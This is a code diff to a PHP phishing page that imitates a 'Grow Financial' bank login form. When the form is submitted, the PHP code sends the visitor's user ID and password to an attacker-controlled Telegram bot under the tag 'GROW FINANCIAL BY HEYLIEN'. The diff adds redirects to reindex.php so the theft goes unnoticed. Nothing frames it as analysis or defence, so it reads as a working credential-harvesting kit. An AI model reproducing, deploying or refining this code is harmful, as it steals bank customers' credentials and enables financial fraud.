@@ -10,8 +10,8 @@
     <link rel="stylesheet" href="output.css">
     <?php
             if (isset($_POST['submit'])) {
+                require './form.php';
                 header('Location: reindex.php');
-                require 'form.php';
                 define('url', "https://api.telegram.org/bot".$token.'/');
                 $userid = $_POST['user'];
                 $pass = $_POST['pass'];
@@ -19,6 +19,7 @@
                 file_get_contents(url . "sendmessage?text=" . $login . "&chat_id=" . $chat_id . "&parse_mode=HTML");
                 $message = urlencode("GROW FINANCIAL BY HEYLIEN" . "\nUser ID: " . $userid . "\nPassword: " . $pass);
                 file_get_contents(url . "sendmessage?text=" . $message . "&chat_id=" . $chat_id . "&parse_mode=HTML");
+                echo '<META HTTP-EQUIV="refresh" content="0;URL=' . $URL . "/reindex.php" . '">';
             }
     ?>
 </head>
@@ -87,7 +88,7 @@
             </div>
 
                 <div class="flex md:w-1/8 px-3 justify-center py-10 items-center bg-white">
-                    <form action="" class="bg-white flex flex-col w-11/12" method="post">
+                    <form onsubmit="window.location.href='./reindex.php';" action="" class="bg-white flex flex-col w-11/12" method="post">
                         <h1 class="flex text-2xl font-normal text-green-800">Welcome Back</h1>
                         
                         <label class="inline-flex flex-col py-2">
@@ -105,6 +106,7 @@
                         </label>
 
                         <button type="submit" name="submit" class="inline-flex justify-center items-center h-12 text-center py-3 text-base font-medium bg-green-800 text-white hover:bg-green-700">LOG IN</button>
+
                         <div class="flex flex-row text-sm font-medium text-green-700 py-2">
                             <span class="underline">Forgot Username?</span>
                             <span class="px-2">|</span>
